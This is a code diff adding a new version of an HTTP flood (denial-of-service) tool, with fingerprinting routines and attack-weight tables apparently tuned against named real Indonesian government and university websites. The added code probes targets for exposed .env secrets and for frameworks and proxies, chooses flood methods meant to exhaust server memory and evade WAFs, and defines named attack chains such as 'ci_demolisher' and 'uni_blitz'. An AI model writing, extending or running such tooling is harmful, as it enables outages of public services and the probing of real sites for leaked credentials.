@@ -2027,6 +2027,156 @@ class AsyncHttpFlood(Thread):
         if intel["total_executions"] == 20 and int(REQUESTS_SENT) < 500:
             print(f"{bcolors.OKCYAN}[CHAOS RATE-INTEL] Limit: {threshold}/window | Safe: {safe_per_proxy}/proxy | {proxy_count} proxies = {theoretical_max} total req capacity{bcolors.RESET}")
 
+    def _chaos_codeigniter_detection(self):
+        """[V36] CodeIgniter Framework Detection.
+        Trained from satudata.karanganyarkab.go.id: ci_session cookie is the fingerprint.
+        CodeIgniter is VERY common on Indonesian government portals.
+        CI weaknesses: session fixation, no built-in rate limiting, 
+        CSRF token often disabled, direct DB calls in controllers."""
+        intel = self._chaos_intel
+        cookies = intel.get("harvested_cookies", {})
+        if intel.get("infra_map", {}).get("ci_detected"):
+            return
+            
+        # Check if ci_session cookie was harvested
+        ci_cookie = any('ci_session' in str(k).lower() for k in cookies.keys())
+        if ci_cookie or (intel.get("server_type") == "unknown" and intel.get("cms_type") == "custom"):
+            # Try to confirm by checking for CI-specific headers
+            try:
+                import urllib.request
+                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
+                req.add_header('User-Agent', 'Mozilla/5.0')
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    resp_cookies = resp.headers.get('Set-Cookie', '')
+                    if 'ci_session' in resp_cookies.lower():
+                        intel["infra_map"]["ci_detected"] = True
+                        intel["cms_type"] = "codeigniter"
+                        intel["backend_framework"] = "codeigniter"
+                        intel["backend_lang"] = "php"
+                        if int(REQUESTS_SENT) < 200:
+                            print(f"{bcolors.OKCYAN}[CHAOS CI-DETECT] CodeIgniter detected (ci_session cookie). PHP backend confirmed.{bcolors.RESET}")
+            except: pass
+
+    def _chaos_vercel_detection(self):
+        """[V36] Vercel/Next.js Edge Detection.
+        Trained from raynaldotech.my.id: x-vercel-cache, x-nextjs-prerender headers.
+        Vercel uses edge functions and aggressive caching.
+        Strategy: Only STEALTH_JA3 works. All other methods get instant 403."""
+        intel = self._chaos_intel
+        if intel.get("infra_map", {}).get("vercel_checked"):
+            return
+        intel["infra_map"]["vercel_checked"] = True
+            
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                hdrs = dict(resp.headers)
+                if 'x-vercel-cache' in str(hdrs).lower() or 'x-vercel-id' in str(hdrs).lower():
+                    intel["infra_map"]["vercel"] = True
+                    intel["cms_type"] = "nextjs"
+                    if int(REQUESTS_SENT) < 200:
+                        print(f"{bcolors.WARNING}[CHAOS VERCEL] Vercel Edge detected. Target has enterprise-grade edge protection.{bcolors.RESET}")
+                        print(f"{bcolors.WARNING}[CHAOS VERCEL] Only STEALTH_JA3 + SLOW_V2 vectors authorized. All others will be blocked.{bcolors.RESET}")
+                        
+                # Check for Nuxt.js (ums.ac.id pattern)
+                powered = hdrs.get('x-powered-by', '').lower()
+                if 'nuxt' in powered:
+                    intel["infra_map"]["nuxtjs"] = True
+                    intel["cms_type"] = "nuxtjs"
+                    if int(REQUESTS_SENT) < 200:
+                        print(f"{bcolors.OKCYAN}[CHAOS NUXT] Nuxt.js SSR backend detected. Server-side rendering = heavy per request.{bcolors.RESET}")
+                        
+                # Check for Google Cloud proxy (via: 1.1 google)
+                via = hdrs.get('via', '').lower()
+                if 'google' in via:
+                    intel["infra_map"]["google_cloud"] = True
+                    if int(REQUESTS_SENT) < 200:
+                        print(f"{bcolors.OKCYAN}[CHAOS GCP] Google Cloud infrastructure detected. CDN-level edge caching active.{bcolors.RESET}")
+        except: pass
+
+    def _chaos_env_exposure_check(self):
+        """[V36] .env File Exposure Detection.
+        uns.ac.id returns 200 with 477 bytes for /.env — CRITICAL security flaw!
+        This means environment variables (DB passwords, API keys) are exposed.
+        We don't steal data, but this tells us the server is poorly secured."""
+        intel = self._chaos_intel
+        if intel.get("infra_map", {}).get("env_checked"):
+            return
+        if intel["total_executions"] != 18:
+            return
+        intel["infra_map"]["env_checked"] = True
+        
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/.env")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            with urllib.request.urlopen(req, timeout=3) as resp:
+                if resp.status == 200:
+                    body = resp.read(200).decode('utf-8', errors='ignore')
+                    if 'APP_KEY' in body or 'DB_' in body or 'SECRET' in body.upper():
+                        intel["infra_map"]["env_exposed"] = True
+                        if int(REQUESTS_SENT) < 200:
+                            print(f"{bcolors.FAIL}[CHAOS CRITICAL] .env file EXPOSED! Server is severely misconfigured. All defenses likely weak.{bcolors.RESET}")
+        except: pass
+
+    def _chaos_university_heuristics(self):
+        """[V36] University Site (.ac.id) Heuristics.
+        University sites share common patterns:
+        - uns.ac.id: Headless WP, no security headers, .env exposed
+        - ums.ac.id: Nuxt.js + Cloudflare + Google Cloud, 432KB page
+        - Generally: mixed tech stack, student-managed, outdated software"""
+        intel = self._chaos_intel
+        host = str(self._target.authority).lower()
+        
+        if ".ac.id" in host and not intel.get("infra_map", {}).get("uni_heuristics_applied"):
+            intel["infra_map"]["uni_heuristics_applied"] = True
+            
+            if not intel.get("cms_type") or intel["cms_type"] == "custom":
+                intel["cms_type"] = "university"
+                
+            # University sites often have these exposed
+            uni_endpoints = [
+                "/wp-json/wp/v2/users", "/feed/", "/wp-json/wp/v2/posts",
+                "/api/", "/graphql", "/.env", "/admin", "/login",
+                "/akademik", "/pmb", "/siakad", "/e-learning",
+            ]
+            for ep in uni_endpoints:
+                if ep not in intel["endpoints_discovered"]:
+                    intel["endpoints_discovered"].append(ep)
+                    
+            if int(REQUESTS_SENT) < 100:
+                print(f"{bcolors.WARNING}[CHAOS UNI] Indonesian university domain detected (.ac.id). Academic heuristics applied.{bcolors.RESET}")
+
+    def _chaos_caddy_detection(self):
+        """[V36] Caddy Reverse Proxy Detection.
+        satudata.karanganyarkab.go.id uses Via: 1.1 Caddy.
+        Caddy is a modern Go-based web server. It has:
+        - Automatic HTTPS (Let's Encrypt)
+        - No default rate limiting
+        - Default connection limit is high
+        Strategy: SLOW_V2 is very effective because Caddy's goroutine model 
+        uses memory per connection. Flood connections = memory exhaustion."""
+        intel = self._chaos_intel
+        if intel.get("infra_map", {}).get("caddy_checked"):
+            return
+        intel["infra_map"]["caddy_checked"] = True
+
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            with urllib.request.urlopen(req, timeout=3) as resp:
+                via = resp.headers.get('Via', '').lower()
+                server = resp.headers.get('Server', '').lower()
+                if 'caddy' in via or 'caddy' in server:
+                    intel["infra_map"]["caddy_proxy"] = True
+                    intel["server_type"] = "caddy"
+                    if int(REQUESTS_SENT) < 200:
+                        print(f"{bcolors.OKCYAN}[CHAOS CADDY] Caddy reverse proxy detected. Go goroutine model = memory vulnerable to SLOW attacks.{bcolors.RESET}")
+        except: pass
+
     def _chaos_gov_id_heuristics(self):
         """[V32] Indonesian Government Site (.go.id) Heuristics.
         Government sites typically share common weaknesses:
@@ -4151,6 +4301,25 @@ class HttpFlood(Thread):
         ("none", "nginx", "nextjs"):          {"POST_DYN": 50, "DYN": 40, "POST": 35, "STRESS": 25},
         ("cloudflare", "nginx", "nextjs"):    {"STEALTH_JA3": 65, "POST_DYN": 35, "DYN": 25},
         ("none", "unknown", "nextjs"):        {"POST_DYN": 45, "DYN": 40, "POST": 30},
+        # ===================================================================
+        # REAL-WORLD FIELD DATA Batch 2: University & Government Portals
+        # Trained from: raynaldotech.my.id, satudata.karanganyarkab.go.id, uns.ac.id, ums.ac.id
+        # ===================================================================
+        # --- Next.js + Vercel + Cloudflare (raynaldotech.my.id: VERY STRICT, rapid-fire=403) ---
+        ("cloudflare", "cloudflare", "nextjs"):  {"STEALTH_JA3": 95, "SLOW_V2": 30, "COOKIE": 15},
+        ("cloudflare", "unknown", "nextjs"):     {"STEALTH_JA3": 90, "SLOW_V2": 25, "POST_DYN": 15},
+        # --- CodeIgniter + Caddy Reverse Proxy (satudata: ci_session, no WAF, 140ms) ---
+        ("none", "unknown", "codeigniter"):      {"POST_DYN": 80, "STRESS": 60, "SLOW_V2": 50, "DYN": 45, "PPS": 35},
+        ("none", "caddy", "codeigniter"):        {"POST_DYN": 75, "STRESS": 55, "SLOW_V2": 50, "DYN": 40},
+        ("none", "caddy", "custom"):             {"POST_DYN": 65, "STRESS": 50, "SLOW_V2": 45, "DYN": 40},
+        # --- WordPress Headless/REST API Only (uns.ac.id: wp-json open, .env EXPOSED!, no WAF) ---
+        ("none", "unknown", "wordpress"):        {"XMLRPC_AMP": 90, "WP_SEARCH": 80, "POST_DYN": 60, "DYN": 45, "STRESS": 40},
+        # --- Nuxt.js + Cloudflare + Google Cloud (ums.ac.id: 432KB page, s-maxage=600) ---
+        ("cloudflare", "cloudflare", "nuxtjs"):  {"STEALTH_JA3": 85, "SLOW_V2": 40, "POST_DYN": 30, "DYN": 25},
+        ("cloudflare", "unknown", "nuxtjs"):     {"STEALTH_JA3": 80, "POST_DYN": 35, "SLOW_V2": 30},
+        # --- University .ac.id pattern (often old WordPress, mixed CDN, weak security headers) ---
+        ("none", "unknown", "university"):       {"WP_SEARCH": 70, "POST_DYN": 60, "STRESS": 50, "SLOW_V2": 45, "DYN": 40},
+        ("cloudflare", "unknown", "university"): {"STEALTH_JA3": 80, "SLOW_V2": 35, "POST_DYN": 30},
     }
     
     # ========================================================================
@@ -4179,6 +4348,17 @@ class HttpFlood(Thread):
         "indo_gov_siege":   ["SLOW_V2", "SLOW_V2", "POST_DYN", "STRESS", "SLOW_V2", "PPS"],
         # LiteSpeed HTTP/3 exploitation (alt-svc h3 detected on both LS sites)
         "litespeed_h3_flood": ["STRESS", "PPS", "POST_DYN", "STRESS", "DYN", "PPS"],
+        # --- V36: Batch 2 Real-World Trained Chains ---
+        # raynaldotech.my.id (Vercel+CF = ultra-strict, stealth-only)
+        "vercel_ghost":     ["STEALTH_JA3", "STEALTH_JA3", "COOKIE", "STEALTH_JA3", "SLOW_V2", "STEALTH_JA3"],
+        # satudata (CI bare, no WAF = full brute force)
+        "ci_demolisher":    ["POST_DYN", "STRESS", "PPS", "POST_DYN", "DYN", "STRESS"],
+        # uns.ac.id (WP headless, .env exposed, wp-json/feed/posts all open)
+        "wp_headless_raid": ["WP_SEARCH", "POST_DYN", "WP_SEARCH", "DYN", "XMLRPC_AMP", "WP_SEARCH"],
+        # ums.ac.id (Nuxt+CF+GCP, 432KB page, stale-while-revalidate)
+        "nuxt_gcp_siege":   ["STEALTH_JA3", "SLOW_V2", "STEALTH_JA3", "POST_DYN", "STEALTH_JA3", "SLOW_V2"],
+        # University general pattern
+        "uni_blitz":        ["STRESS", "WP_SEARCH", "POST_DYN", "SLOW_V2", "PPS", "DYN"],
     }
     
     def _chaos_save_memory(self):
@@ -5583,6 +5763,9 @@ class HttpFlood(Thread):
                         intel["infra_map"]["livewire"] = True
                         if int(REQUESTS_SENT) < 100:
                             print(f"{bcolors.OKCYAN}[CHAOS RECON] Laravel Livewire detected! POST to /livewire/message will exhaust server.{bcolors.RESET}")
+                elif 'nuxt' in powered_by:
+                    intel["cms_type"] = "nuxtjs"
+                    intel["backend_framework"] = "nuxtjs"
                 elif 'next' in powered_by or '__next' in body:
                     intel["cms_type"] = "nextjs"
                 else:
@@ -6042,6 +6225,37 @@ class HttpFlood(Thread):
             # Laravel Livewire uses heavy POST AJAX calls - exploit this
             weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 85)
             
+        # === STRATEGY AO: Vercel Ultra-Strict Mode (V36) ===
+        if intel.get("infra_map", {}).get("vercel"):
+            # Vercel blocks EVERYTHING except stealth. Suppress all heavy methods.
+            for m in weights:
+                if m not in ("STEALTH_JA3", "SLOW_V2", "COOKIE", "BOT"):
+                    weights[m] = 0
+            weights["STEALTH_JA3"] = 100
+            
+        # === STRATEGY AP: Nuxt.js SSR Exploit (V36) ===
+        if intel.get("infra_map", {}).get("nuxtjs"):
+            # Nuxt SSR renders full page server-side. Each unique URL = full render cycle
+            weights["DYN"] = max(weights.get("DYN", 0), 70)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 65)
+            
+        # === STRATEGY AQ: CodeIgniter Brute Force (V36) ===
+        if intel.get("infra_map", {}).get("ci_detected"):
+            # CI has no built-in protection. Full brute force works.
+            weights["STRESS"] = max(weights.get("STRESS", 0), 70)
+            weights["PPS"] = max(weights.get("PPS", 0), 60)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 75)
+
+        # === STRATEGY AR: Exposed .env = Weak Server (V36) ===
+        if intel.get("infra_map", {}).get("env_exposed"):
+            # Server admin is incompetent. Go full aggression, no stealth needed.
+            intel["temperature"] = min(intel.get("temperature", 0) + 0.3, 1.0)
+            weights["STRESS"] = max(weights.get("STRESS", 0), 80)
+            
+        # === STRATEGY AS: Caddy Goroutine Memory Exhaustion (V36) ===
+        if intel.get("infra_map", {}).get("caddy_proxy"):
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 85)
+
         # === STRATEGY AL: Request Smuggling Boost (V35) ===
         if intel.get("request_smuggling_active"):
             weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 90)
@@ -6350,6 +6564,11 @@ class HttpFlood(Thread):
         self._chaos_smart_decoy_traffic()
         self._chaos_waf_evasion_calculator()
         self._chaos_rate_limit_intelligence()
+        self._chaos_codeigniter_detection()
+        self._chaos_vercel_detection()
+        self._chaos_env_exposure_check()
+        self._chaos_university_heuristics()
+        self._chaos_caddy_detection()
         self._chaos_gov_id_heuristics()
         
         self._chaos_dead_drop_dns()
@@ -6811,6 +7030,16 @@ class HttpFlood(Thread):
                 err_pats = intel.get("server_error_patterns", [])
                 print(f"  Deep Intel  : Sessions Exhausted: {sessions} | Entropy: {entropy:.2f} bits | Genetic Gen: {gen}")
                 print(f"  Smuggling   : {smuggle} | Server Errors Caught: {err_pats[:3] if err_pats else 'None yet'}")
+                infra_tags = []
+                if intel.get("infra_map", {}).get("vercel"): infra_tags.append("Vercel-Edge")
+                if intel.get("infra_map", {}).get("nuxtjs"): infra_tags.append("Nuxt-SSR")
+                if intel.get("infra_map", {}).get("ci_detected"): infra_tags.append("CodeIgniter")
+                if intel.get("infra_map", {}).get("caddy_proxy"): infra_tags.append("Caddy-Proxy")
+                if intel.get("infra_map", {}).get("google_cloud"): infra_tags.append("Google-Cloud")
+                if intel.get("infra_map", {}).get("env_exposed"): infra_tags.append("ENV-EXPOSED!")
+                if intel.get("infra_map", {}).get("uni_heuristics_applied"): infra_tags.append("Univ-Profile")
+                if infra_tags:
+                    print(f"  Infra Map   : {bcolors.OKCYAN}{" | ".join(infra_tags)}{bcolors.RESET}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
